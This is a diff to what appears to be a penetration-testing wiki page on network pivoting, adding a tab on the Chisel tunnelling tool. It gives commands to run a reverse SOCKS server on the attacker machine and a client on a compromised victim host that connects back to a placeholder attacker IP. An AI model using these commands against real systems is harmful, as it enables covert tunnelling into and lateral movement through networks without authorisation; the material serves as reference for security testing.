@@ -40,6 +40,20 @@ ssh -N -R $PORT $CONTROLLED_TARGET
 ```
 {% endtab %}
 
+{% tab title="Chisel" %}
+[Chisel](https://github.com/jpillora/chisel) is a standalone binary for pivoting on Linux and Windows systems.
+
+Working on a server/client, the binary simply needs to be uploaded on the victim host and executed as server on the attacker machine.
+
+```bash
+# attacker
+chisel server --reverse --socks5 -p $PORT
+
+# victim
+chisel client $ATTACKER_MACHINE_IP:$ATTACKER_MACHINE_PORT R:socks
+```
+{% endtab %}
+
 {% tab title="SSH config" %}
 
 {% endtab %}
